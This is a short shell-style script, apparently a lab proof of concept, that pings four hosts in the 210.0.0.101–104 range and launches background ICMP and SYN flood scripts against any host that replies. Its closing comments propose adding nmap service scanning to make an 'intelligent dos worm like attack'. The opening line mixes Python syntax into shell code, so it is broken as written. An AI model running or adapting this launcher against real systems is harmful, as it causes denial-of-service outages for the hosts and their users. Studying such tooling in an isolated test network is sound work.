while True: 
	if (( ping 210.0.0.101 -c 1 | grep -q 'from'))
	then
			echo "Bhost 1 found - ICMP attack"
			python icmp/icmp-flooder_simple.py 210.0.0.101 & 
	fi
	if (( ping 210.0.0.102 -c 1 | grep -q 'from'))
	then
			echo "Bhost 2 found - ICMP attack"
			python icmp/icmp-flooder_simple.py 210.0.0.102 &
	fi

	if (( ping 210.0.0.103 -c 1 | grep -q 'from'))
	then
			echo "Bhost 3 found - SYN attack"
			sh syn-flood/flooder_simple.sh 210.0.0.103 1234 & 
	fi 
	if (( ping 210.0.0.104 -c 1 | grep -q 'from'))          
	then    
			echo "Bhost 4 found - SYN attack"
			sh syn-flood/flooder_simple.sh 210.0.0.104 1234 &
	fi


# sth like nmap -A -T 1 210.0.0.101 could be used and then grep http-server and launch the attck aginst the server port or so to show more of like intelligent dos worm like attack 

# but the proof of concept shopwn now is good too 
